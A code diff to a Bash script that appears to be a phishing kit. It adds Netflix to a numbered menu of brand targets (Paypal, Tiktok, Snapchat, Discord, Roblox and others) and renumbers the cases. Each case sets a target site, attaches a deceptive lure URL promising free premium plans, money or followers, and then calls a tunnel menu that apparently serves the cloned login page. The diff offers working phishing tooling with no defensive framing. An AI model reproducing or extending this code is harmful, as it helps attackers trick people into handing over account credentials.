@@ -715,15 +715,16 @@ main_menu() {
 		${MAGENTA}[${CYAN}03${MAGENTA}]${BLUE} Google
 		${MAGENTA}[${CYAN}04${MAGENTA}]${BLUE} Cryto
 		${MAGENTA}[${CYAN}05${MAGENTA}]${BLUE} Microsoft
-		${MAGENTA}[${CYAN}06${MAGENTA}]${BLUE} Paypal
-		${MAGENTA}[${CYAN}07${MAGENTA}]${BLUE} Tiktok
-		${MAGENTA}[${CYAN}08${MAGENTA}]${BLUE} Snapchat
-		${MAGENTA}[${CYAN}09${MAGENTA}]${BLUE} Spotify
-		${MAGENTA}[${CYAN}10${MAGENTA}]${BLUE} Xbox
-		${MAGENTA}[${CYAN}11${MAGENTA}]${BLUE} Github
-		${MAGENTA}[${CYAN}12${MAGENTA}]${BLUE} Discord
-		${MAGENTA}[${CYAN}13${MAGENTA}]${BLUE} Roblox
-		${MAGENTA}[${CYAN}14${MAGENTA}]${BLUE} Verizon
+		${MAGENTA}[${CYAN}06${MAGENTA}]${BLUE} Netflix
+		${MAGENTA}[${CYAN}07${MAGENTA}]${BLUE} Paypal
+		${MAGENTA}[${CYAN}08${MAGENTA}]${BLUE} Tiktok
+		${MAGENTA}[${CYAN}09${MAGENTA}]${BLUE} Snapchat
+		${MAGENTA}[${CYAN}10${MAGENTA}]${BLUE} Spotify
+		${MAGENTA}[${CYAN}11${MAGENTA}]${BLUE} Xbox
+		${MAGENTA}[${CYAN}12${MAGENTA}]${BLUE} Github
+		${MAGENTA}[${CYAN}13${MAGENTA}]${BLUE} Discord
+		${MAGENTA}[${CYAN}14${MAGENTA}]${BLUE} Roblox
+		${MAGENTA}[${CYAN}15${MAGENTA}]${BLUE} Verizon
 		
 		${MAGENTA}[${CYAN}99${MAGENTA}]${BLUE} About         ${MAGENTA}[${CYAN}00${MAGENTA}]${BLUE} Exit
 
@@ -747,38 +748,42 @@ main_menu() {
 			mask='https://unlimited-onedrive-space-for-free'
 			tunnel_menu;;
 		6 | 06)
+			website="netflix"
+			mask='https://upgrade-your-netflix-plan-free'
+			tunnel_menu;;
+		7 | 07)
 			website="paypal"
 			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
-		7 | 07)
+		8 | 08)
 			website="tiktok"
 			mask='https://tiktok-free-liker'
 			tunnel_menu;;
-		8 | 08)
+		9 | 09)
 			website="snapchat"
 			mask='https://view-locked-snapchat-accounts-secretly'
 			tunnel_menu;;
-		9 | 09)
+		10)
 			website="spotify"
 			mask='https://convert-your-account-to-spotify-premium'
 			tunnel_menu;;
-		10)
+		11)
 			website="xbox"
 			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
-		11)
+		12)
 			website="github"
 			mask='https://get-1k-followers-on-github-free'
 			tunnel_menu;;
-		12)
+		13)
 			website="discord"
 			mask='https://get-discord-nitro-free'
 			tunnel_menu;;
-		13)
+		14)
 			website="roblox"
 			mask='https://get-free-robux'
 			tunnel_menu;;
-		14)
+		15)
 			website="verizon"
 			mask='https://get-unlimited-data'
 			tunnel_menu;;
